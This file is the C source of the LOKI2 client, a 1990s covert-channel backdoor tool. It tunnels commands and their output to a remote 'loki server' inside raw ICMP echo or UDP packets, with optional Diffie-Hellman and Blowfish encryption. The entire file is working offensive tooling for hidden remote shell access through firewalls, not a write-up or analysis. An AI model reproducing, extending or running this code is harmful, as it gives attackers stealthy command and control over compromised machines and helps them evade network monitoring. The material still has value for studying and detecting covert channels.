/*
 * LOKI2
 *
 * [ loki.c ]
 *
 *  1996/7 Guild Corporation Worldwide      [daemon9]
 */


#include "loki.h"

jmp_buf env;
struct loki sdg, rdg;
int verbose     = OK, cflags = 0, ripsock = 0, tsock = 0;
u_long p_read   = 0;                    /* packets read */


#ifdef  STRONG_CRYPTO
DH *dh_keypair = NULL;                  /* DH public and private keypair */
extern u_short ivec_salt;
#endif
 

int main(int argc, char *argv[])
{

    static int prot         = IPPROTO_ICMP, one = 1, c = 0;
#ifdef  STRONG_CRYPTO
    static int established  = 0, retran = 0;
#endif
    static u_short loki_id  = 0;
    int timer               = MIN_TIMEOUT;
    u_char buf[BUFSIZE]     = {0};
    struct protoent *pprot  = 0;
    struct sockaddr_in sin;
                                        /* Ensure we have proper permissions */
    if (getuid() || geteuid()) err_exit(1, 1, verbose, L_MSG_NOPRIV);
    loki_id = getpid();                 /* Allows us to individualize each  
                                         * same protocol loki client session
                                         * on a given host.  
                                         */
    bzero((struct sockaddr_in *)&sin, sizeof(sin));
    while ((c = getopt(argc, argv, "v:d:t:p:")) != EOF)
    {
        switch (c)
        {
            case 'v':                   /* change verbosity */
                verbose = atoi(optarg);
                break;

            case 'd':                   /* destination address of daemon */
                strncpy(buf, optarg, BUFSIZE - 1);
                sin.sin_family      = AF_INET;
                sin.sin_addr.s_addr = name_resolve(buf);                 
                break;

            case 't':                   /* change alarm timer */
                if ((timer = atoi(optarg)) < MIN_TIMEOUT)
                     err_exit(1, 0, 1, "Invalid timeout.\n");
                break;
                                        
            case 'p':                   /* select transport protocol */
                switch (optarg[0])
                {
                    case 'i':           /* ICMP_ECHO / ICMP_ECHOREPLY */
                        prot = IPPROTO_ICMP;
                        break;

                    case 'u':           /* DNS query / reply */
                        prot = IPPROTO_UDP;
                        break;

                    default:
                        err_exit(1, 0, verbose, "Unknown transport.\n");
                }
                break;
 
            default:
                err_exit(0, 0, 1, C_MSG_USAGE);
        }
    }
                                        /* we need a destination address */
    if (!sin.sin_addr.s_addr) err_exit(0, 0, verbose, C_MSG_USAGE);
    if ((tsock = socket(AF_INET, SOCK_RAW, prot)) < 0)
        err_exit(1, 1, 1, L_MSG_SOCKET);

#ifdef  STRONG_CRYPTO                   /* ICMP only with strong crypto */
    if (prot != IPPROTO_ICMP) err_exit(0, 0, verbose, L_MSG_ICMPONLY);
#endif
                                        /* Raw socket to build packets */
    if ((ripsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
         err_exit(1, 1, verbose, L_MSG_SOCKET);
#ifdef  DEBUG
    fprintf(stderr, "\nRaw IP socket: ");
    fd_status(ripsock, OK);
#endif

#ifdef  IP_HDRINCL
    if (setsockopt(ripsock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
        if (verbose) perror("Cannot set IP_HDRINCL socket option");
#endif
                                        /* register packet dumping function
                                         * to be called upon exit 
                                         */
    if (atexit(packets_read) == -1) err_exit(1, 1, verbose, L_MSG_ATEXIT);
 
    fprintf(stderr, L_MSG_BANNER);
    for (; ;)
    {
#ifdef  STRONG_CRYPTO
                                        /* Key negotiation phase.  Before we
                                         * can do anything, we need to share 
                                         * a secret with the server.  This
                                         * is our key management phase.  
                                         * After this is done, we are 
                                         * established.  We try MAX_RETRAN 
                                         * times to contact a  server.
                                         */
        if (!established)
        {                                    
                                        /* Generate the DH parameters and public
                                         * and private keypair
                                         */
            if (!dh_keypair)
            {
                if (verbose) fprintf(stderr, "\nloki: %s", L_MSG_DHKEYGEN);
                if (!(dh_keypair = generate_dh_keypair()))
                    err_exit(1, 0, verbose, L_MSG_DHKGFAIL);
            }
            if (verbose) fprintf(stderr, "\nloki: submiting our public key to server");
                                        /* convert the BIGNUM public key
                                         * into a big endian byte string
                                         */
            bzero((u_char *)buf, BUFSIZE);
            BN_bn2bin((BIGNUM *)dh_keypair -> pub_key, buf);
                                        /* Submit our key and request to
                                         * the server (in one packet)
                                         */
            if (verbose) fprintf(stderr, C_MSG_PKREQ);
            loki_xmit(buf, loki_id, prot, sin, L_PK_REQ);
        }
        else
        {
#endif
            bzero((u_char *)buf, BUFSIZE);
            fprintf(stderr, PROMPT);        /* prompt user for input */
            read(STDIN_FILENO, buf, BUFSIZE - 1);
            buf[strlen(buf)] = 0;
                                            /* Nothing to parse */
            if (buf[0] == '\n') continue;   /* Escaped command */
            if (buf[0] == '/') if ((!c_parse(buf, &timer))) continue;
                                        /* Send request to server */
            loki_xmit(buf, loki_id, prot, sin, L_REQ);
#ifdef  STRONG_CRYPTO
        }
#endif
                                        /* change transports */
        if (cflags & NEWTRANS)
        {
            close(tsock);
            prot = (prot == IPPROTO_UDP) ? IPPROTO_ICMP : IPPROTO_UDP;
            if ((tsock = socket(AF_INET, SOCK_RAW, prot)) < 0)
                 err_exit(1, 1, verbose, L_MSG_SOCKET);

            pprot = getprotobynumber(prot);
            if (verbose) fprintf(stderr, "\nloki: Transport protocol changed to %s.\n", pprot -> p_name);
            cflags &= ~NEWTRANS;
            continue;
        }
        if (cflags & TERMINATE)         /* client should exit */
        {
            fprintf(stderr, "\nloki: clean exit\nroute [guild worldwide]\n");  
            clean_exit(0);
        }
                                        /* Clear TRAP and VALID PACKET flags */
        cflags &= (~TRAP & ~VALIDP);    
                                        /* set alarm singal handler */
        if (signal(SIGALRM, catch_timeout) == SIG_ERR)
            err_exit(1, 1, verbose, L_MSG_SIGALRM);
                                        /* returns true if we land here as the 
                                         * result of a longjmp() -- IOW the 
                                         * alarm timer went off
                                         */
        if (setjmp(env))
        {
            fprintf(stderr, "\nAlarm.\n%s", C_MSG_TIMEOUT);
            cflags |= TRAP;
#ifdef  STRONG_CRYPTO
            if (!established)           /* No connection established yet */
                if (++retran == MAX_RETRAN) err_exit(1, 0, verbose, "[fatal] cannot contact server.  Giving up.\n");
                else if (verbose) fprintf(stderr, "Resending...\n");
#endif
        }
        while (!(cflags & TRAP))
        {                               /* TRAP will not be set unless the 
                                         * alarm timer expires or we get
                                         * an EOT packet 
                                         */
           alarm(timer);                /* block until alarm or read */

           if ((c = read(tsock, (struct loki *)&rdg, LOKIP_SIZE)) < 0)
                perror("[non fatal] network read error"); 

            switch (prot)
            {                           /* Is this a valid Loki packet? */
                case IPPROTO_ICMP:
                    if ((IS_GOOD_ITYPE_C(rdg))) cflags |= VALIDP;
                    break;

                case IPPROTO_UDP:
                    if ((IS_GOOD_UTYPE_C(rdg))) cflags |= VALIDP;
                    break;

                default:
                    err_exit(1, 0, verbose, L_MSG_WIERDERR);
            }
            if (cflags & VALIDP)
            {
#ifdef  DEBUG
        fprintf(stderr, "\n[DEBUG]\tloki: read %d bytes, packet type: ", c);
        PACKET_TYPE(rdg);
        DUMP_PACKET(rdg, c);
#endif
                                        /* we have a valid packet and can
                                         * turn off the alarm timer
                                         */
                alarm(0);
                switch (rdg.payload[0]) /* determine packet type */
                {
                    case L_REPLY :      /* standard reply packet */
                        bcopy(&rdg.payload[1], buf, BUFSIZE - 1);
                        blur(DECR, BUFSIZE - 1, buf);
#ifndef DEBUG
                        fprintf(stderr, "%s", buf);
#endif
                        p_read++;
                        break;

                    case L_EOT :        /* end of transmission packet */
                        cflags |= TRAP;
                        p_read++;
                        break;

                    case L_ERR :        /* error msg packet (not encrypted) */
                        bcopy(&rdg.payload[1], buf, BUFSIZE - 1);
                        fprintf(stderr, "%s", buf);
#ifdef  STRONG_CRYPTO
                                        /* If the connection is not established
                                         * we exit upon receipt of an error
                                         */
                        if (!established) clean_exit(1);
#endif
                        break;
#ifdef  STRONG_CRYPTO
                    case L_PK_REPLY :   /* public-key receipt */
                        if (verbose) fprintf(stderr, C_MSG_PKREC);
                                        /* compute DH key parameters */
                        DH_compute_key(buf, (void *)BN_bin2bn(&rdg.payload[1], BN2BIN_SIZE, NULL), dh_keypair);
                                        /* extract blowfish key from the
                                         * DH shared secret.  
                                         */
                        if (verbose) fprintf(stderr, C_MSG_SKSET);
                        extract_bf_key(buf, OK);
                        established = OK;
                        break;
#endif
                    case L_QUIT:        /* termination directive packet */
                        fprintf(stderr, C_MSG_MUSTQUIT);
                        clean_exit(0);

                    default :
                        fprintf(stderr, "\nUnknown LOKI packet type");
                        break;
                }
                cflags &= ~VALIDP;      /* reset VALID PACKET flag */
            }
        }
    }
    return (0);
}


/*
 *  Build and transmit Loki packets (client version)
 */

void loki_xmit(u_char *payload, u_short loki_id, int prot, struct sockaddr_in sin, int ptype)
{

    bzero((struct loki *)&sdg, LOKIP_SIZE);
                                        /* Encrypt and load payload, unless
                                         * we are doing key management
                                         */
    if (ptype != L_PK_REQ)
    {
#ifdef  STRONG_CRYPTO
        ivec_salt++;
#endif
        blur(ENCR, BUFSIZE - 1, payload);
    }
    bcopy(payload, &sdg.payload[1], BUFSIZE - 1);

    if (prot == IPPROTO_ICMP)
    {
#ifdef  NET3                                            /* Our workaround. */
        sdg.ttype.icmph.icmp_type   = ICMP_ECHOREPLY;
#else
        sdg.ttype.icmph.icmp_type   = ICMP_ECHO;
#endif
        sdg.ttype.icmph.icmp_code   = (int)NULL;
        sdg.ttype.icmph.icmp_id     = loki_id;          /* Session ID */
        sdg.ttype.icmph.icmp_seq    = L_TAG;            /* Loki ID */
        sdg.payload[0]              = ptype;
        sdg.ttype.icmph.icmp_cksum  = 
             i_check((u_short *)&sdg.ttype.icmph, BUFSIZE + ICMPH_SIZE);
    }
    if (prot == IPPROTO_UDP)
    {
        sdg.ttype.udph.uh_sport     = loki_id;
        sdg.ttype.udph.uh_dport     = NL_PORT;
        sdg.ttype.udph.uh_ulen      = htons(UDPH_SIZE + BUFSIZE);
        sdg.payload[0]              = ptype;
        sdg.ttype.udph.uh_sum       = 
             i_check((u_short *)&sdg.ttype.udph, BUFSIZE + UDPH_SIZE);
    }
    sdg.iph.ip_v    = 0x4;
    sdg.iph.ip_hl   = 0x5;
    sdg.iph.ip_len  = FIX_LEN(LOKIP_SIZE);
    sdg.iph.ip_ttl  = 0x40;
    sdg.iph.ip_p    = prot;
    sdg.iph.ip_dst  = sin.sin_addr.s_addr;
    
    if ((sendto(ripsock, (struct loki *)&sdg, LOKIP_SIZE, (int)NULL, (struct sockaddr *) &sin, sizeof(sin)) < LOKIP_SIZE))
    {
        if (verbose) perror("[non fatal] truncated write");
    }
}


/*
 *  help is here
 */

void help()
{

    fprintf(stderr,"
    %s\t\t-  you are here
    %s xx\t\t-  change alarm timeout to xx seconds (minimum of %d)
    %s\t\t-  query loki server for client statistics 
    %s\t\t-  query loki server for all client statistics 
    %s\t\t-  swap the transport protocol ( UDP <-> ICMP ) [in beta]
    %s\t\t-  quit the client
    %s\t\t-  quit this client and kill all other clients (and the server)
    %s dest\t\t-  proxy to another server    [ UNIMPLIMENTED ]
    %s dest\t-  redirect to another client [ UNIMPLIMENTED ]\n",

    HELP, TIMER, MIN_TIMEOUT, STAT_C, STAT_ALL, SWAP_T, QUIT_C, QUIT_ALL, PROXY_D, REDIR_C);
}


/*
 *  parse escaped commands
 */

int c_parse(u_char *buf, int *timer)
{

    cflags &= ~VALIDC;
                                        /* help */
    if (!strncmp(buf, HELP, sizeof(HELP) - 1) || buf[1] == '?')
    {
        help();
        return (NOK);
    }
                                        /* change alarm timer */
    else if (!strncmp(buf, TIMER, sizeof(TIMER) - 1))
    {
        cflags |= VALIDC;
        (*timer) = atoi(&buf[sizeof(TIMER) - 1]) > MIN_TIMEOUT ? atoi(&buf[sizeof(TIMER) - 1]) : MIN_TIMEOUT;
        fprintf(stderr, "\nloki: Alarm timer changed to %d seconds.", *timer);
        return (NOK);
    }
                                        /* Quit client, send notice to server */
    else if (!strncmp(buf, QUIT_C, sizeof(QUIT_C) - 1))
        cflags |= (TERMINATE | VALIDC);
                                        /* Quit client, send kill to server */
    else if (!strncmp(buf, QUIT_ALL, sizeof(QUIT_ALL) - 1))
        cflags |= (TERMINATE | VALIDC);
                                        /* Request server-side statistics */
    else if (!strncmp(buf, STAT_C, sizeof(STAT_C) - 1))
        cflags |= VALIDC;
                                        /* Swap transport protocols */
    else if (!strncmp(buf, SWAP_T, sizeof(SWAP_T) - 1))
    {
                                        /* When using strong crypto we do not
                                         * want to swap protocols.
                                         */
#ifdef  STRONG_CRYPTO
        fprintf(stderr, C_MSG_NOSWAP);
        return (NOK);
#elif   !(__linux__)
        fprintf(stderr, "\nloki: protocol swapping only supported in Linux\n");
        return (NOK);
#else
        cflags |= (NEWTRANS | VALIDC);
#endif

    }
                                        /* Request server to redirect output
                                         * to another LOKI client 
                                         */ 
    else if (!strncmp(buf, REDIR_C, sizeof(REDIR_C) - 1))
        cflags |= (REDIRECT | VALIDC);        
                                        /* Request server to simply proxy 
                                         * requests to another LOKI server
                                         */   
    else if (!strncmp(buf, PROXY_D, sizeof(PROXY_D) - 1))
        cflags |= (PROXY | VALIDC);        

                                        /* Bad command trap */
    if (!(cflags & VALIDC))
    {
        fprintf(stderr, "Unrecognized command %s\n",buf);
        return (NOK);
    }

    return (OK);  
}


/*
 *  Dumps packets read by client... 
 */

void packets_read()
{
    fprintf(stderr, "Packets read: %ld\n", p_read);
}

/* EOF */
